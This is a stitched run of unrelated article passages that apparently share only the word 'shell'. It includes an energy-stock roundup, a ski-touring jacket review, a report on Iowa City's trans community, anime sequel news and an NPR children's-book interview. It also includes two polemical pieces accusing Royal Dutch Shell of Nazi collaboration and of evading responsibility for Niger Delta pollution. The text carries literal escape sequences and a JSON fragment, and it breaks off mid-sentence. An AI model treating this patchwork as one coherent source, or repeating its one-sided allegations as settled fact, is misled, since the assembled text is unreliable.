than a decade of experience in power system deployment, IMG has developed a highly efficient modular power block design. This fourth-generation technology offers a standardized, scalable and pre-tested configuration, reducing installation complexities while maintaining reliability. Its self-contained nature ensures adaptability to various sites without the need for extensive redesign, making the technology ideal for data centers, industrial facilities and large-scale microgrids.\n\nThe modular power approach provides rapid deployment capabilities, minimizing downtime and ensuring an efficient, uninterrupted power supply. The design also supports lower emissions and optimized operational costs, aligning with Liberty\u2019s commitment to sustainable energy solutions. By integrating this technology, LBRT strengthens its ability to meet growing energy demands with flexible and resilient power infrastructure. (Liberty Energy Acquires IMG Energy to Expand Power Solutions)\n\n5. VAALCO Energy, a U.S.-based independent exploration and production firm, has announced that it has entered an agreement to acquire a 70% stake in the CI-705 block off the coast of C\u00f4te d\u2019Ivoire. The company has assumed operatorship of the block alongside its partners Ivory Coast Exploration Oil & Gas and PETROCI, the national oil company of C\u00f4te d\u2019Ivoire.\n\nVAALCO has also mentioned that it will hold 100% paying interest in the block outlined via a commercial carry agreement. This implies that EGY would be responsible for taking over the costs related to exploration and production activities on the block. Block CI-705 is located near Eni\u2019s Calao discovery in C\u00f4te d\u2019Ivoire, which is deemed to be the second-largest hydrocarbon discovery in the country.\n\nThe CI-705 block is located in the Tano Basin, approximately 70 kilometers west of VAALCO\u2019s CI-40 block. The block spans an area of approximately 2,300 sq. km. The water depth at the site varies between zero and 2,500 meters. (VAALCO Expands in West Africa, Acquires 70% Stake in Block CI-705)\n\nPrice Performance\n\nWith oil and gas moving down for the week, stocks were mostly southbound. The Energy Select Sector SPDR \u2014 a popular way to track energy companies \u2014 edged down 3.9% last week. But over the past six months, the sector tracker has gone up 2.7%.\n\nWhat\u2019s Next in the Energy World?\n\nMarket participants will keep a close eye on regular data releases to gauge the direction of commodities. U.S. government statistics on oil and natural gas, one of the most reliable indicators, will be a key focus for energy traders. Fuel demand and stock drawdowns in the coming weeks will shape commodity price trends. Additionally, Baker Hughes' rig count data, a critical indicator of U.S. crude and natural gas production trends, is also closely monitored.\n\nWhy Haven't You Looked at Zacks' Top Stocks?\n\nSince 2000, our top stock-picking strategies have blown away the S&P's +7.7% average gain per year.

Conditions included sunny and cloudy weather, mostly warm temperatures and strong winds. The kit saw around 30 hours of use and covered roughly 10,000 vertical meters, from hut approaches to glacier travel and the final climb to the peak.\n\n\n\n\n\nSpecs\n\nGuide Shell Hybrid Jacket - 580 gr in Size Large - 399 EUR\n\nGuide Shell Hybrid Pants - 650 g in Size Large - 299 EUR\n\n\n\n\n\nPros\n\nSmart design (tough and long-lasting materials) that provides waterproofing and breathability in key areas.\n\nGenerous ventilation zippers on both the jacket and pants for temperature control.\n\nTailored fit with a lot of stretch for a great feel and unrestricted movement.\n\nTwo-way zipper (jacket) allows easy access to your harness\n\nRECCO reflector at brim of hood\n\n\n\n\n\nCons\n\nLacks built-in gaiters on the pants, which may impact snow protection.\n\nBelt is a little bit too elastic\n\n\n\n\n\nFit & First Impressions\n\nBoth the jacket and pants have an athletic fit, so I sized up to a Large for ski touring and mountaineering. I am 180 cm (5\u201911\u201d) tall and weigh around 70 kg (154 lbs). The jacket fits perfectly in Large, leaving enough room for an insulating layer underneath.\n\nHowever, I could have stuck with my usual Medium for the pants, particularly around the hip area. The elastic belt holds up well, but I find it could be a bit tighter for a more secure fit.\n\n\n\n\n\nBoth pieces feel great to wear, with plenty of stretch in key areas, ensuring unrestricted movement. The pants fit well over lightweight ski touring boots like the Atomic Backland, Scarpa F1 or Dynafit TLT.\n\n\n\n\n\nI tested them with my Backland XTD boots, and while they worked fine, anything bulkier might be a tight fit. The pants don\u2019t include a built-in gaiter, but adding one would be a great improvement in future iterations.\n\n\n\n\n\nDescription & Details\n\nThe Guide Shell Hybrid Kit is engineered to balance hardshell weather protection with softshell breathability and stretch. It features Dermizax hardshell fabric (20,000 mm waterproofing, 20,000 g/m\u00b2/24h breathability) in high-exposure areas such as the shoulders, knees, and zones prone to snow accumulation, while breathable, stretchable softshell fabric is placed where mobility and airflow are most needed.\n\n\n\n\n\nFor added durability, the inner lower legs are reinforced to withstand contact with ski edges and crampons.\n\n\n\n\n\nVentilation is well thought out, with large underarm zippers on the jacket and zippered thigh vents on the pants, allowing for quick temperature regulation.\n\nThe zippers function smoothly, and the two generously sized jacket pockets are perfectly placed for easy access while wearing a harness or backpack. The pants also offer ample storage, featuring two smaller pockets and two larger ones, including a dedicated space for an avalanche beacon.\n\n\n\n\n\nPerformance & Conclusion\n\nI\u2019ll admit\u2014I was skeptical at first about the hybrid softshell/hardshell concept in a ski touring kit. Would it really offer the best of both worlds, or would it come with compromises?\n\nAfter putting the Stellar Guide Shell Hybrid Kit to the test, I can confidently say it works amazingly well.\n\n\n\n\n\nThe biggest challenge with softshells is weather protection, but Stellar has solved this by using body-mapped fabrics \u2014 placing hardshell exactly where you need waterproofing, while keeping softshell fabric in areas that benefit from stretch and breathability. This means you get unrestricted movement, incredible ventilation, and reliable weather protection, all in one lightweight kit.\n\n\n\n\n\nOverheating is rare (even when ascending), thanks to the unmatched breathability of the softshell fabric, and when needed, the huge ventilation zips provide instant airflow.\n\n\n\n\n\nOn colder days, adding an insulating layer underneath keeps you warm without sacrificing mobility.\n\n\n\n\n\nThe strategically placed hardshell panels also make a big difference when bootpacking or scrambling, offering extra protection in high-contact areas.\n\n\n\n\n\nIf you\u2019re a ski tourer looking for a high-performance, breathable and functional kit, I\u2019d totally recommend the Stellar Guide Shell Hybrid Jacket and Pants. The freedom of movement and ventilation will amaze you, and you won\u2019t be sacrificing any essential weather protection.\n\n\n\n\n\nComparison\n\nBlack Diamond Dawn Patrol Hybrid Jacket (380 EUR) + Black Diamond Dawn Patrol Hybrid Pants (330 EUR): The Stellar Guide Kit offers a more streamlined fit, which feels better optimized for ski touring compared to the slightly baggier Dawn Patrol kit. Ventilation is also superior\u2014thanks to larger vent zippers and better-placed softshell panels, making uphill travel much more comfortable. While both kits provide similar weather protection, the Stellar Guide Kit\u2019s balance of breathability, mobility, and fit makes it in my opinion the better choice for ski touring.\n\n\n\n\n\nTester Profile\n\nNico, 29 years old, Innsbruck (Austria). I started running in 2019 after moving to Vienna. To add some variety to my training for the Vienna City Marathon, I started running on the trails around Kahlenberg. When the pandemic hit and everything was cancelled, I moved to Innsbruck. Since Innsbruck has limited flat terrain, I began trail running in the Nordkette area. I quickly became hooked and mainly trained there, participating in several races between 60-85 kilometers. In the last two years, I've focused more on shorter, faster trail races between 20 and 45 kilometers. In the off-season and winter, besides road running, I spend my time mainly (ski) mountaineering. My 5k PB is 17:30, I've never run any other road races.\n\n\n\n\n\nShopping at our partners is much appreciated and helps support RoadTrailRun\n\n\n\n\n\nSamples were provided at no charge for review purposes.

There's such a sense of interconnectedness.\u201d\n\nDenney said that friends and loved ones who are choosing to leave the state are making \u201ca really personal choice\u201d that she understands. Several people she knows are preparing to leave if they need to, knowing that there are also many who don't want to.\n\nDenney plans to continue supporting the trans community and making sure her friends are OK.\n\nShe said she's seen friends invest in mutual aid work through the Iowa Trans Mutual Aid fund, which helps support the costs of gender-affirming care in the state. She said that's one way to support the trans community and to continue their push for equality.\n\nMore: 'We will win': LGBTQ Iowans rally at the Iowa Capitol after bills targeting their rights\n\n\u201cPeople are realizing that there is more to fighting these bills and protecting the trans community than lobbying, than contacting state and local officials,\u201d Denney said. \u201cThere is a lot more material work on the ground in their communities that people have the power to do. And I think we're starting to see people realizing that and opening up to doing that work. I think that\u2019s wonderful.\u201d\n\n\u2018Most meaningful change\u2019 will happen on the ground\n\nDenney is monitoring how Iowa City and Johnson County leaders proceed because she believes the \u201cmost meaningful change\u201d will happen on the local level when leaders \u201ctake responsibility\u201d and show care \u201cfor their communities.\u201d\n\nSome leaders, like Iowa City Mayor Bruce Teague, Councilor Laura Bergus and Johnson County Supervisor V Fixmer-Oraiz, were in Des Moines as the legislature considered SF 418.\n\nDenney spoke at the March 11 Iowa City City Council meeting a few minutes after the mayor read a proclamation for Trans Day of Visibility on March 31. Denney stressed the importance of city support and asked, \u201cWhat are you going to do?\u201d\n\n\u201cWhen these kids are renting apartments in the future and their landlords say, \u2018No, sorry, you\u2019re trans. Try elsewhere.\u2019 What are you going to do?\u201d Denney said during the council meeting. \u201cWhen they get fired from their jobs for being who they are, when I get fired from my job for being who I am, what are you going to do?\u201d\n\nDenney asked many of the same questions to Iowa City leaders in 2024. This time, she told the Press-Citizen, those leaders seem to be willing to take first-in-the-nation, \u201ctrailblazing\u201d action to protect Iowans.\n\nDenney hopes Iowa City can legally challenge the new state law while she is hopeful the community can find ways to \"stand up for people when fascists come after them.\"\n\nDenney believes Johnson County has the potential to become a \u201cbeacon\u201d and a \u201csafe haven\u201d for transgender people.\n\n\u201cPeople are going out of their way to really strengthen the bonds in the trans community we have in Iowa City and to start to really think about what we can do to protect it,\u201d Denney said.\n\nRyan Hansen covers local government and crime for the Press-Citizen.

But Mamoru Oshii isn\u2019t done with his opus, having recently stated, \u201cThere is something I want to do for the third film. There is only one thing I have left to do. If I can do it, I would like to do it.\u201d [Mantan Web]\n\nThe franchise\u2019s significant cultural imprint across east and west alike implies a lay-up. (We can consider its predecessor\u2019s unique Scarlett Johansson-led live-action remake a brief blip on the map.) Yet at last night\u2019s Niigata International Animation Film Festival, Innocence\u2018s producer (and Production I.G. chairman) Mitsuhisa Ishikawa revealed that its production costs\u2013\u20132 billion yen, which amounts to more than $13 million USD\u2013\u2013have still not been recouped over two decades. Nevertheless, intention remains:\n\n\u201cIf we don\u2019t recoup the production costs, there won\u2019t be a third movie. I want to spread the word about this. I want to see it too. If you watch Innocence, you\u2019ll get a hint (for the third movie). If we make a sequel to this movie, we can recoup all of that.\u201d\n\nThat last line suggests some willingness to move forward with a third film as means of recouping on both productions, though translation issues perhaps present themselves. Whatever the case, a public cry might be the motivator\u2013\u2013in an era of legacy sequels for which essentially nobody asked, is the conclusion to an anime and sci-fi benchmark such an odd proposal? I\u2019ll let a slight idealism present itself.",

His name is Ivo, and he lived in an empty moon snail shell on a beach of sand until a wave carried him away. He now lives in an empty moon snail shell on the sea. He was scared at first, but he grew to love it so, as the stories he wrote will show. Ivo's adventures are the work of John Himmelman. The author and illustrator now joins us from the studios of WNPR in Hartford, Connecticut. His book, \"The Boy Who Lived In A Shell: Snippets For Wandering Minds.\" Thank you so much for being with us.\n\nJOHN HIMMELMAN: Oh, thank you for having me.\n\nSIMON: I guess children are the intended audience, but I sure liked it. How did Ivo come to you?\n\nHIMMELMAN: I wanted to tell some stories in as few words as possible for people with wandering minds. And I needed a way to connect them, and Ivo was the way to do that. He's the one is was telling the stories. And throughout the book, you're also learning a little bit about Ivo as he's getting older and older out in the sea in this shell.\n\nSIMON: Could I ask you to read one? The Rumple Twins.\n\nHIMMELMAN: Oh, sure. That's the first one in the story.\n\n(Reading) The Rumple Twins lived in a tree. They ate there. They read there. They wept there. They slept there. They never ever left that tree until one day - nope, they're still up there.\n\nSIMON: (Laughter) You don't need a lot of words for a surprise ending.\n\nHIMMELMAN: (Laughter).\n\nSIMON: The illustration's of a giant tree. A couple of tiny twins seem to be happily situated on a branch high above the ground. Do stories come first to you or the scene?\n\nHIMMELMAN: Both. It was mostly the mood, the feel of it. I mean, some of them are wry, as I've been told, and some are a little sad 'cause I think there's nothing wrong with a sad story here and there. And some of them are just silly. A lot of these because they're so short, they're ideas I've had for longer books that just wouldn't work, and I got to plug in these characters that I might have come up with 20,30 years ago. And I got to actually bring them to life in this book.\n\nSIMON: Let's continue with Ivo's stories. Would you let me have the pleasure of reading Penguin?\n\nHIMMELMAN: Oh, please do.\n\nSIMON: (Reading) Penguin sat on a chunk of ice. He bobbed up and down in the southern sea. Room for me? Asked Walrus. OK, said Penguin. Walrus climbed on, but he was too big. The ice sunk beneath them. Penguin stood on Walrus. They bobbed up and down in the southern sea.\n\nAnd then the illustration is just one of the happiest you can ever imagine of a Walrus and his hands tucked over his stomach as he floats, and the penguin seemingly quite happy on top of him.\n\nHIMMELMAN: I should have you read all my stories for me.\n\nSIMON: Well, it would be an honor. I love them so.\n\nHIMMELMAN: (Laughter).\n\nSIMON: I've read that you worked in the library stacks, and that had an important contribution to literature. We'll put it that way.\n\nHIMMELMAN: Oh, yeah. I was in my last year at School of Visual Arts, trying to figure out, all right, what am I going to do with four years of art school? And at the time I was working in the Commack Library in Long Island, New York, and I was working in the children's book section, putting away all these classics like Mercer Mayer's books and Maurice Sendak, of course. And my favorite was Arnold Lobel and his \"Frog And Toad\" series that just inspired me. Here's a way to combine words and pictures, both of which I was interested in. And I took a course in writing and illustrating children's books in my last year in college, and I've been doing it since.\n\nSIMON: Could I get you to read Dolphin's story?\n\nHIMMELMAN: So Dolphin is a recurring character.\n\n(Reading) Dolphin was the nicest creature in all the sea. He shared everything he had. Once he found a crayon. He balanced it on his nose. He gave the crayon to a boy. That boy wrote a story about Dolphin. He liked his first sentence so much, he made it his last two. He wanted everyone to know one thing about Dolphin. What did the boy want them to know? Dolphin was the nicest creature in all the sea.\n\nSIMON: I love that story. And on the one hand, you think, well, you know, that's all that needs to be said. But when somebody is the nicest creature in the sea, we should say it a lot, shouldn't we?\n\nHIMMELMAN: We should. And, of course, it's a dolphin.\n\nSIMON: Yeah. Subtitle of your book, \"Snippets For Wandering Minds.\" Why wandering?\n\nHIMMELMAN: I think there's attention span challenges these days with longer pieces. And I was speaking to that. You could pick it up and put it down at any time. If your mind's wandering, there's no pressure, and especially for kids that feel somewhat challenged by reading longer things. This gives it to them in smaller bites or snippets.\n\nSIMON: In all of your work, have you uncovered or developed something that's just really essential to reaching into a child's mind and heart?\n\nHIMMELMAN: What I do is I write to make myself laugh. I write to make myself sad, and I just hope that translates to other people, other children. And I think what I have is I have strong memories of how things affected me when I was a child, different emotions. I remember happiness. I remember sadness. I remember excitement. And I don't think those change over the years. If I could touch that in my own stories, in my own work, that - hopefully, that will relate to others. And I don't mind adults enjoying it as well. That's how I start. You know, I'm an adult, so I start writing for me.\n\nSIMON: Can I ask you to read or sing even from Everything Stinks?\n\nHIMMELMAN: Oh, boy, I'm not going to sing it (laughter). That's Crabby's story. So what happened was when Ivo sleeps, the stories don't come out, and it's the stories that keep his shell afloat. So Crab decided to come in and write some stories. And being a crab, his stories are somewhat crabby. So one of the stories he wrote is Everything Stinks.\n\n(Reading) Sing along time, sang the crab who sang. Nothing goes right. Everything's wrong. Nothing is nice, blah, blah, blah. Everything stinks. Nothing's worth doing. You're all too smelly. Blah, blah, blah. And you're all too loud. Everything's boring. Sun's in my eyes. Blah, blah, blah. Blah, blah, blah, blah.\n\nSIMON: (Laughter).\n\nHIMMELMAN: I don't know how I would sing that (laughter).\n\nSIMON: Where's Ivo now?\n\nHIMMELMAN: I don't want to give away the ending. He's still telling stories, cranking away in a little moon snail shell on the sea.\n\nSIMON: John Himmelman, who has written \"The Boy Who Lived In A Shell: Snippets For Wandering Minds.\" Thank you so much for having your mind wander a little bit with ours. Thank you.\n\nHIMMELMAN: (Laughter) It's been my pleasure. Thank you.\n\nSIMON: (SOUNDBITE OF EZRA COLLECTIVE'S \"SPACE IS THE PLACE\")\n\nCopyright \u00a9 2025 NPR. All rights reserved.

Key references include Shell\u2019s own commissioned History of Royal Dutch Shell (which details the company\u2019s activities during 1933\u201345), journalism by researchers like Marriott, Macalister, and Donovan, and reports from outlets such as openDemocracy and The Guardian that discuss the ethical implications of Shell\u2019s WWII involvement.\n\n\u2022 Financial Support: Royal Dutch Shell\u2019s leadership had deep ties with Nazi Germany. Sir Henri Deterding, a co-founder and long-time chairman of Shell, was an open admirer of Adolf Hitler and reportedly provided significant financial backing to the Nazi Party in the early 1930s. Shell\u2019s funding was so substantial that it \u201csaved the Nazi Party\u201d from financial ruin before World War II.\n\n\u2022 Collaboration and Fuel Supply: As World War II approached, Shell split into two operational branches \u2013 essentially an Allied corporation and an Axis corporation. Its German subsidiary, Rhenania-Ossag, fully aligned with the Nazi regime, ensuring German oil needs were met. Shell\u2019s own commissioned history notes that after Hitler annexed neighboring countries, Shell\u2019s directors allowed Rhenania-Ossag to absorb Shell businesses in those territories, directly supporting Germany\u2019s expansion. During the war, Shell was effectively \u201cbacking both horses,\u201d fueling both Allied and Axis powers for profit. Aviation fuel from Shell fed Hitler\u2019s Luftwaffe and Britain\u2019s RAF alike, meaning even dogfights during the Battle of Britain could feature planes on Shell-provided fuel.\n\n\u2022 Anti-Semitic Policies: Shell\u2019s Nazi-era collaboration went beyond fuel. The company adopted Nazi ideology on the continent, complying with anti-Semitic laws. In 1933, soon after the Nazis took power, Shell\u2019s German arm fired all Jewish board members, replacing them with Nazi-approved personnel. According to Shell\u2019s own historians, this purge was carried out with the full knowledge and consent of Shell\u2019s central management \u2013 \u201cno questions of principle or moral judgements\u201d were raised about the Hitler regime. Shell thus \u201csold out its own Jewish employees to the Nazis,\u201d as one account summarized. By 1940, after the Netherlands fell to Germany, the Swastika flag was literally flying over Shell\u2019s headquarters in The Hague, a stark symbol of how entwined the company had become with the Nazi occupation.\n\n\u2022 Use of Forced Labor: Like many firms operating under the Third Reich, Shell\u2019s German subsidiaries also benefited from forced labor during the war. Over 1,100 forced laborers \u2013 civilians from occupied countries and POWs \u2013 were compelled to work at Shell\u2019s refineries in Germany and Austria, receiving no pay. This wartime exploitation, documented in historical records, further ties Shell to Nazi-era atrocities and the Holocaust\u2019s industrial crimes.\n\nLack of Acknowledgment or Responsibility\n\n\u2022 No Official Apology: Despite this documented history, Shell has never issued a formal public apology for its dealings with the Nazi regime. This contrasts with other companies (for example, European railroads) that have paid reparations or officially apologized for World War II collaboration. \u201cNo such actions or gestures from Shell\u201d have been made to acknowledge its role in supporting the Nazi war effort.\n\n\u2022 Limited Compensation: Shell also has not directly paid reparations specific to its Nazi-era conduct. Some German industries, including oil companies, contributed to general funds compensating forced labor victims, but Shell itself has offered no dedicated compensation to the families of its own Jewish employees who were purged or to other victims of its wartime operations. In the late 1990s, Shell\u2019s German arm faced criticism for its use of forced labour during WWII, pressuring the company to contribute to broader compensation schemes. However, no individual, Shell-led reparations or funds have ever been publicly announced.\n\n\u2022 Historical Disclosure (but No Accountability): To its credit, Shell did commission an extensive official history of the company, published in multiple volumes in the 2000s, which openly details Shell\u2019s World War II activities. The historians had access to Shell\u2019s archives, and Shell\u2019s involvement with the Nazi regime \u2013 including the takeover of companies in occupied countries and the Aryanization (removal of Jewish staff) in its German business \u2013 is noted in these books. However, Shell has treated this as a historical record rather than an obligation to apologize. The company has not widely publicized these findings nor accompanied them with any official statement of regret or wrongdoing. In essence, Shell\u2019s stance has been one of documentation without public accountability.\n\nLingering Controversies and Calls for Accountability\n\n\u2022 Criticism from Activists and Scholars: In recent years, journalists, historians, and activists have drawn attention to Shell\u2019s Nazi-era connections and lambasted the company\u2019s silence. A 2021 investigative book, Crude Britannia: How Oil Shaped a Nation, revealed in vivid detail \u201cthe extent to which the oil company Royal Dutch Shell played a key role in Hitler\u2019s war effort.\u201d The authors James Marriott and Terry Macalister describe how Shell profited from fascism, prompting renewed scrutiny. Following these revelations, commentators openly called for Shell to apologise for \u2018fuelling [the] Nazi war machine\u2019. This phrase \u2013 featured in an openDemocracy article by Adam Ramsay \u2013 encapsulates the critique that Shell\u2019s oil and support significantly empowered Nazi Germany\u2019s military aggression.\n\n\u2022 Petitions and Public Pressure: Activists like John Donovan (who runs an independent Shell watchdog blog) have campaigned for Shell to confront this dark chapter. Donovan uncovered Shell\u2019s wartime records and even launched a petition urging Royal Dutch Shell to apologize for its antisemitic conduct and Nazi collaboration. He and others argue that Shell\u2019s failure to clearly repudiate its past actions amounts to a continued betrayal of those harmed \u2013 including its own former employees sent to Nazi camps. These efforts have kept the issue in the spotlight, at least in activist and academic circles, and pose ethical questions Shell can no longer easily ignore.\n\n\u2022 Corporate Response: How has Shell responded to such criticism? Largely with silence and defensiveness. The company has not made any public statements addressing these specific allegations in recent decades. According to Donovan, Shell\u2019s initial reaction to his research was to issue legal threats and even launch a global spying operation to monitor his activities. However, Shell ultimately chose not to sue for libel \u2013 likely to avoid drawing more attention to the underlying facts. In media inquiries, Shell has tended to either decline comment or refer vaguely to the historical work already published. No formal apology, no press release of contrition, and no dedicated memorial efforts have come from Shell\u2019s leadership regarding its Nazi-era conduct. This tepid response is seen by critics as an attempt to \u201cmove on\u201d without truly reckoning with the company\u2019s past.\n\nEthical Implications for Shell\u2019s Modern Reputation\n\n\u2022 Trust and Moral Responsibility: Shell\u2019s historical links to the Nazi regime raise enduring ethical questions about the company\u2019s values. The fact that Shell once prioritized business interests over moral imperatives \u2013 literally trading with and bolstering a genocidal dictatorship \u2013 troubles many observers. Ethicists argue that how a company addresses past wrongs is a test of its corporate character. Shell\u2019s reluctance to formally acknowledge or atone for its Nazi collaboration \u201cstains the name of Royal Dutch Shell\u201d in the eyes of history. By failing to apologize or make amends, Shell may be undermining trust in its current commitments to human rights, diversity, and ethical business. Simply put, if a company cannot condemn its complicity in one of history\u2019s greatest evils, critics ask whether it truly upholds integrity today.\n\n\u2022 Reputation and Public Perception: The lingering Nazi-era controversy adds to Shell\u2019s reputational challenges. In recent years, Shell has often been rated poorly in public opinion due to environmental disasters, climate change stances, and human rights issues. In fact, Shell was labeled the \u201cworld\u2019s most hated\u201d energy brand in one survey. Notably, that reputation was earned \u201cbefore the Nazi history of Shell was generally known.\u201d There is an implication that if Shell\u2019s WWII conduct becomes more widely publicized, it could further erode public regard for the company. For younger generations and socially conscious consumers, such historical revelations can be shocking, possibly leading to boycotts or protests demanding accountability. Shell risks appearing as if it is sweeping a shameful legacy under the rug, which can conflict with its modern branding and social responsibility efforts.\n\n\u2022 Transparency vs. Accountability: To Shell\u2019s supporters, the company did take a step by funding an independent historical review \u2013 demonstrating transparency about its past. But transparency alone is not the same as accountability. The ethical critique in the modern day is that Shell has not accompanied truth-telling with remorse or remedial action. Companies like Shell face growing pressure not only to perform well financially but also to align with moral and social norms. This includes openly owning up to historical misdeeds. The case of Shell\u2019s Nazi-era entanglement highlights how unresolved historical ethical issues can continue to haunt a corporation. It serves as a reminder that corporate responsibility spans generations: how a company addresses its historical sins can impact its legitimacy and social license to operate in the present. In Shell\u2019s case, the absence of an apology or restitution for its Nazi collaboration remains a point of contention that the company may eventually be forced to confront as part of repairing its public image.\n\nSources: Historical investigations, corporate archives, and recent analyses were used to compile these findings. Key references include Shell\u2019s own commissioned History of Royal Dutch Shell (which details the company\u2019s activities during 1933\u201345), journalism by researchers like Marriott, Macalister, and Donovan, and reports from outlets such as openDemocracy and The Guardian that discuss the ethical implications of Shell\u2019s WWII involvement. These sources highlight the facts of Shell\u2019s collaboration with Nazi Germany and examine the company\u2019s modern-day response \u2013 or lack thereof \u2013 to this legacy. The consensus among many critics is that Shell\u2019s historical entanglement with the Nazi regime raises serious ethical concerns that continue to affect its reputation today, underscoring the importance of accountability for past corporate conduct.\n\nShare this: Facebook\n\nTwitter\n\nEmail\n\nPrint\n\n\n\nLike this: Like Loading...\n\nThis website and sisters royaldutchshellgroup.com johndonovan.website , and shellnews.net , are owned by John Donovan .

            "content": "Wall Street is an invisible partner in Shell\u2019s plunder: happy to enjoy the spoils, deaf to the spoils of war Shell waged on Nigeria\u2019s environment\n\nCue the confetti: Shell is finally packing its bags after 87 years in Nigeria\u2019s Niger Delta. But before anyone applauds, note that the oil giant is slipping out the back door largely to avoid cleaning up the monumental mess it created, all while still clinging to the profitable parts of the business. In a $2.8 billion \u201cexit\u201d deal announced in January, Shell agreed to sell its onshore Nigerian subsidiary to a local consortium called Renaissance. How noble\u2014except Shell isn\u2019t really riding off into the sunset. The company generously decided to loan the buyers $1.2 billion to help them purchase Shell\u2019s assets and will pony up another $1.3 billion to fund future cleanup and gas projects. Why would an exiting company invest further? Perhaps because those projects conveniently benefit Shell\u2019s remaining 25.6% stake in Nigeria\u2019s gas enterprise. In other words, Shell is getting paid to \u201cleave\u201d while secretly keeping a foot in the door and a hand in the cookie jar.\n\nOf course, Shell has made sure someone else will deal with the dirty aftermath. The new owners will \u201ctake over responsibility\u201d for all the fun stuff \u2013 oil spills, pipeline theft, sabotage, and cleaning up decades of pollution \u2013 freeing Shell to wash its hands of the whole onshore nightmare. How convenient. Shell\u2019s press release basically says: Not our problem anymore, blame the locals now. Environmental campaigners, however, aren\u2019t buying this corporate vanishing act and insist Shell must not be allowed to escape culpability for the catastrophe it caused in the Delta. As one long-time Ogoni activist, Celestine Akpobari, put it: \u201cShell has to restore our environment and lost livelihoods before selling anything. Our environment should be restored to the level Shell met it.\u201d \u2013 a level that was a heck of a lot cleaner than what Shell is leaving behind.\n\n87 Years of Oil Spills and Suffering\n\nShell\u2019s legacy in Nigeria can be measured in oil-soaked wetlands, poisoned rivers, and shattered communities. Over nearly nine decades, millions of barrels of oil have been spilled across the Niger Delta. In just the decade between 2011 and 2022, more than 10,000 oil spills were recorded \u2013 an ecological apocalypse that Shell consistently downplayed or blamed on \u201csabotage.\u201d These spills, combined with Shell\u2019s continuous gas flaring (giant open-air fires that save Shell money while pumping toxic fumes into local lungs ), have devastated livelihoods. In many villages, people who once lived by fishing and farming can no longer feed their families from the polluted land and water. \u201cOur people enjoy their fishing and farming business but can\u2019t do that anymore,\u201d Akpobari laments. Now, he says, \u201cwe\u2026 watch our children and dependants die of hunger and sickness because of poverty.\u201d This is the human cost of Shell\u2019s operations: families driven into destitution by the destruction of their environment.\n\nFor decades, Niger Delta residents have protested and fought back. Starting in the early 1990s, civil society uprisings took aim at Shell\u2019s rampant pollution and gas flaring (those toxic fire pits lighting up the Delta sky). None suffered more famously than the Ogoni people. In 1995, after years of speaking out against Shell\u2019s destruction, nine Ogoni activists \u2013 including renowned writer Ken Saro-Wiwa \u2013 were hanged by Nigeria\u2019s military regime. The trial that condemned them was such a sham that even then-UK Prime Minister John Major described it as \u201cfraudulent.\u201d And guess who had a front-row seat? Shell. The company had a \u201cwatching brief\u201d at the trial, and later several witnesses revealed that Shell and government officials bribed them with cash, houses and jobs to testify against the activists. (Shell, of course, denies it did any such thing \u2013 it always denies, no matter how damning the evidence.) The blood of the Ogoni Nine has stained Shell\u2019s reputation ever since, and Ogoni communities have spent decades seeking justice for the company\u2019s role in their leaders\u2019 deaths.\n\nShell\u2019s response to these outrages has been equal parts PR spin and covert scheming. Publicly, the company tried to distance itself, painting its Nigerian subsidiary as a lone bad apple. In a classic piece of corporate excuse-making, Shell\u2019s London HQ claimed in the \u201890s that it did \u201cnot operate using a top-down management approach\u201d and that each subsidiary was responsible for its own operations. In other words: \u201cDon\u2019t blame us, it was those local guys.\u201d (Right \u2013 as if a Nigerian subsidiary would flout Shell\u2019s directives without approval from London.) Privately, Shell wasn\u2019t above playing dirty to protect its interests. The company hired a sinister private intelligence outfit called Hakluyt \u2013 staffed by former MI6 spies \u2013 to infiltrate and spy on environmental groups. Hakluyt\u2019s agents posed as activists and filmmakers to gather intel on Greenpeace, local Nigerian organizers, and anyone daring to challenge Shell. When this espionage came to light, Shell admitted it had indeed hired Hakluyt, mumbling that it only wanted to protect its employees from \u201cpossible attack\u201d. Because nothing says employee safety like sending undercover spies after Greenpeace. In truth, Shell doesn\u2019t just pollute \u2013 it also silences and sabotages those who expose its misdeeds. Spying on activists, colluding with military dictatorships, brushing off human rights \u2013 it\u2019s all part of the Shell playbook in the Niger Delta.\n\nBlackRock and Vanguard: Cashing In on Catastrophe\n\nThrough all of this, Shell\u2019s biggest investors have sat comfortably in boardrooms an ocean away, making a killing off the killing (of the planet and arguably of people\u2019s livelihoods). Financial giants BlackRock and Vanguard are Shell\u2019s top shareholders, together owning roughly 13% of the company. BlackRock alone holds about an 8% stake and Vanguard about 5% \u2013 making them complicit stakeholders in Shell\u2019s Niger Delta fiasco. These firms love to talk about sustainability in their marketing brochures, but they\u2019ve been profiting from Shell\u2019s dirty business with zero accountability. Every dividend check BlackRock and Vanguard cash comes greased with Niger Delta crude.\n\nIt\u2019s no secret that activists have started calling out these enablers by name. After all, without massive investment from the likes of BlackRock and Vanguard, Shell might have felt more pressure to change its ways. Instead, the oil giant\u2019s financiers have quietly bankrolled environmental destruction, content to rake in profits while communities in Nigeria choke on oil fumes and drink polluted water. Neither BlackRock nor Vanguard has seriously moved to divest from Shell or demand cleanup of the Delta \u2013 their complicity is passive but profound. As long as Shell\u2019s stock delivers returns, the suffering of Nigerian villagers doesn\u2019t show up on their balance sheets. In effect, Wall Street is an invisible partner in Shell\u2019s plunder: happy to enjoy the spoils, deaf to the spoils of war Shell waged on Nigeria\u2019s environment.\n\nDodging Accountability to the End\n\nShell\u2019s escape from Nigeria looks like the grand finale of a long con \u2013 a bid to dodge the growing queue of lawsuits and liability coming its way. In recent years, the company has finally been dragged into court over its Niger Delta operations, and it hasn\u2019t been pretty. Last November, London\u2019s High Court ruled that 13,000 farmers and fishers from the Ogale and Bille communities can sue Shell in the UK over decades of oil spills that destroyed their water and way of life. Shell\u2019s reaction? This isn\u2019t our problem, it\u2019s our subsidiary! The company flat-out denied that it directly owed the affected Nigerians anything, insisting that only its Nigerian subsidiary (SPDC) was responsible \u2013 and SPDC, Shell claimed, had already done what it could to compensate people. Classic Shell move: blame the subsidiary, and by extension blame the victims for suing the wrong entity.\n\nBut that legal dodginess is exactly why Shell wants to offload SPDC now. Once the Nigerian subsidiary is sold to a local buyer, those 13,000 villagers and others like them will have a much harder time hauling Shell into foreign courts. The new owner, Renaissance, will likely be immune from lawsuits in the UK or Netherlands, effectively shielding Shell Plc from accountability. It\u2019s almost as if Shell\u2019s board sat down and said, \u201cQuick, ditch the Nigerian assets before the courts make us pay!\u201d Activists see right through this plan. A coalition of Nigerian and international NGOs (including Amnesty International) wrote to regulators urging them to block Shell\u2019s great escape, accusing the company of trying to use \u201clegal gymnastics\u201d to shirk its responsibility for a \u201cwidespread legacy of pollution.\u201d They demanded that no sale be approved unless 